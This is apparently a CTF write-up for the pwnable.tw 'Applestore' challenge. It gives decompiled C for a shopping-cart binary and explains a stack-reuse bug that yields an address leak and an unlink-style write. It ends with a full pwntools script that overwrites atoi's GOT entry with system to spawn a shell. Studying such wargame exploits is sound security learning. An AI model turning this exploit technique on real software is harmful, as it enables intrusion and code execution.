---
date: '2025-08-29T12:47:23+07:00'
draft: false
title: 'Applestore (200 pts) - pwnable.tw'
tags: ["pwnable.tw"]
---
---

## 0x1. Initial Reconnaissance 

### file
```
↪ file applestore
applestore: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped
```

### checksec
```
↪ checksec --file=applestore
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   91 Symbols	  No	0		4		applestore
```

### ./applestore
```
↪ ./applestore
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
> 
```

---

## 0x2. Reverse Engineering

### handler
```c
unsigned int handler()
{
  char v1[22]; // [esp+16h] [ebp-22h] BYREF
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read((int)v1, 21);
    switch ( atoi(v1) )
    {
      case 1:
        list();
        break;
      case 2:
        add();
        break;
      case 3:
        delete();
        break;
      case 4:
        cart();
        break;
      case 5:
        checkout();
        break;
      case 6:
        puts("Thank You for Your Purchase!");
        return __readgsdword(0x14u) ^ v2;
      default:
        puts("It's not a choice! Idiot.");
        break;
    }
  }
}
```

### add

```c
unsigned int add()
{
  const char **v1; // [esp+1Ch] [ebp-2Ch]
  char v2[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Device Number> ");
  fflush(stdout);
  my_read((int)v2, 21);
  switch ( atoi(v2) )
  {
    case 1:
      v1 = (const char **)create("iPhone 6", 199);
      insert(v1);
      goto LABEL_8;
    case 2:
      v1 = (const char **)create("iPhone 6 Plus", 299);
      insert(v1);
      goto LABEL_8;
    case 3:
      v1 = (const char **)create("iPad Air 2", 499);
      insert(v1);
      goto LABEL_8;
    case 4:
      v1 = (const char **)create("iPad Mini 3", 399);
      insert(v1);
      goto LABEL_8;
    case 5:
      v1 = (const char **)create("iPod Touch", 199);
      insert(v1);
LABEL_8:
      printf("You've put *%s* in your shopping cart.\n", *v1);
      puts("Brilliant! That's an amazing idea.");
      break;
    default:
      puts("Stop doing that. Idiot!");
      break;
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### create
```c
_DWORD *__cdecl create(const char *a1, int a2)
{
  _DWORD *v3; // [esp+1Ch] [ebp-Ch]

  v3 = (_DWORD *)malloc(16);
  v3[1] = a2;
  asprintf(v3, "%s", a1);
  v3[2] = 0;
  v3[3] = 0;
  return v3;
}
```

### insert 
```c
int __cdecl insert(int a1)
{
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
    ;
  i[2] = a1;
  result = a1;
  *(_DWORD *)(a1 + 12) = i;
  return result;
}
```
### delete
```c
unsigned int delete()
{
  int v1; // [esp+10h] [ebp-38h]
  int v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char v6[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read((int)v6, 21);
  v3 = atoi(v6);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      v4 = *(_DWORD *)(v2 + 8);
      v5 = *(_DWORD *)(v2 + 12);
      if ( v5 )
        *(_DWORD *)(v5 + 8) = v4;
      if ( v4 )
        *(_DWORD *)(v4 + 12) = v5;
      printf("Remove %d:%s from your shopping cart.\n", v1, *(const char **)v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = *(_DWORD *)(v2 + 8);
  }
  return __readgsdword(0x14u) ^ v7;
}
```

### cart
```c
int cart()
{
  int v0; // eax
  int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  int i; // [esp+20h] [ebp-28h]
  char v5[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read((int)v5, 21);
  if ( v5[0] == 121 )
  {
    puts("==== Cart ====");
    for ( i = dword_804B070; i; i = *(_DWORD *)(i + 8) )
    {
      v0 = v2++;
      printf("%d: %s - $%d\n", v0, *(const char **)i, *(_DWORD *)(i + 4));
      v3 += *(_DWORD *)(i + 4);
    }
  }
  return v3;
}
```

### checkout
```c
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char v2[4]; // [esp+18h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-1Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(v2, "%s", "iPhone 8");
    v3 = 1;
    insert(v2);
    v1 = 7175;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v4;
}
```

---

## 0x3. Analysis

When you add an item, they will create a chunk of 16 bytes on heap, assume address of this chunk is v, v + 0 would store name of the item, v + 4 stores price of the item, and v + 8 stores the next item, v + 12 stores the previous item (this is for the linked list). Then, this chunk will be inserted into a doubly linked-list, and the head will be stored at 0x804B070. Delete function allows you to remove an item and delete the chunk from the linked-list. Cart function lists all items and calculates the total price. Finally, checkout function prints the total price and if the total price is 7174, they will gift you an Iphone 8 for 1 dollar. And now, notice that in cart, delete and handler, they allow us to input 21 bytes for the numbers, representing the option, resulting to vulnerability.

---

## 0x4. Exploit 

When the total price is 7174, they add Iphone 8 to your cart, but they don't use create funtion to do that, instead they use spaces on stack and add it to linked-list. And because the stack frame of delete and checkout is at the same address (ebp of these two functions is the same). As I said above, we can input 21 bytes for v6 (at ebp - 0x22 ) in delete function and Iphone 8 would be stored at ebp - 0x20. As a result, we can manipulate the tail of the linked-list.
To reach 7174 in total price, you could buy 6 Iphone 6 and 20 Iphone 6 plus or whatever:
```c++
#include <bits/stdc++.h>
using namespace std;

int main()
{
    int r, q, k;
    for (int d = 0; d * 499 <= 7174; ++d){
        r = 7174 - 499 * d;
        for (int c = 0; 399 * c <= r; ++c){
            q = r - 399 * c;
            for (int b = 0; 299 * b <= q; ++b){
                k = q - 299 * b;
                if (k % 199 == 0){
                    cout << k / 199 << ' ' << b << ' ' << c << ' ' << d << '\n';
                }
            }
        }
    }
}
```
After add Iphone 8 to your linked-list, this tail will start from ebp-0x20 and when you call delete function, you can input 21 bytes from ebp-0x22. The first two bytes are for the index you want to remove, the next 16 bytes are spaces of this tail.
```
 printf("Remove %d:%s from your shopping cart.\n", v1, *(const char **)v2);
```
And as you can see after removed, they will print the value at address stored at v2, and in our case, they will print the address's value at ebp - 0x20.

```
ebp-0x22 -> 27 
ebp-0x20 -> the address you want to leak
ebp-0x1c -> (the price of product)
ebp-0x18 -> (the next item) c
ebp-0x14 -> (the previous item) d
...
ebp
```

Now, you can get the libc base, so what next ?

After removing an element from linkedlist, they merge 2 segments like this: 
```c
v4 = *(_DWORD *)(v2 + 8);
v5 = *(_DWORD *)(v2 + 12);
if ( v5 )
*(_DWORD *)(v5 + 8) = v4;
if ( v4 )
*(_DWORD *)(v4 + 12) = v5;
```
So, what if I remove Iphone 8 from linked-list. Assume what's in ebp-0x18 is c and ebp-0x14 is d.
they will do this:
```c
*(d + 8) = c
*(c + 12) = d
```

If we overwrite address of atoi at GOT + 0x22 to ebp-0x18 and ebp-8 to ebp-0x14, after leave instruction (means esp = ebp + 4, ebp = [ebp]), we can make ebp points to the address of atoi at GOT + 0x22. You can get the address of stack leaked from environ in libc, and then calculate the ebp of delete function.

```
   0x08048c05 <+50>:	lea    eax,[ebp-0x22]
   0x08048c08 <+53>:	mov    DWORD PTR [esp],eax
   0x08048c0b <+56>:	call   0x8048799 <my_read>
   0x08048c10 <+61>:	lea    eax,[ebp-0x22]
   0x08048c13 <+64>:	mov    DWORD PTR [esp],eax
   0x08048c16 <+67>:	call   0x8048560 <atoi@plt>
```

And now using my_read in handler you can overwrite address pointed by (ebp-0x22), in this case, it's atoi's GOT address.Overwrite system address and ';sh;' to it, then you can get the shell.

###### Exploit:
``` py
from pwn import *

exe = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *handler")
    else:
        r = remote("chall.pwnable.tw", 10104)

    return r

def add (p, number):
    p.sendafter (b'> ', b'2')
    p.sendafter (b'> ', number)

def delete (p, number):
    p.sendafter (b'> ', b'3')
    p.sendafter (b'> ', number)

def cart (p):
    p.sendafter (b'> ', b'4')
    p.sendafter (b'> ', b'y')

def checkout (p):
    p.sendafter (b'> ', b'5')
    p.sendafter (b'> ', b'y')


def main():
    p = conn()
    for i in range (6):
        add (p, b'1')
    for i in range (20):
        add (p, b'2')
    
    checkout (p)
    delete (p, b'27' + p32 (exe.got['atoi']) + b'\x00' * 12)
    p.recvuntil (b'27:')
    atoi_address = u32 (p.recv (4))
    print ("The address of atoi in libc is: ", hex (atoi_address))
    libc.address = atoi_address - libc.symbols['atoi']
    print ("The address of libc start from : ", hex (libc.address))

    delete (p, b'27' + p32 (libc.symbols['environ']) + b'\x00' * 12)
    p.recvuntil (b'27:')
    leak_stack = u32 (p.recv(4))
    delete_ebp = leak_stack - 0x104
    print ("The address of delete funtion's ebp is: ", hex(delete_ebp))

    delete (p, b'27' + p32(delete_ebp) + b'\x00' * 4 + p32 (exe.got['atoi'] + 0x22) + p32 (delete_ebp - 8))

    p.sendafter (b'> ', p32(libc.symbols['system']) + b';sh;')

    p.interactive()


if __name__ == "__main__":
    main()
```


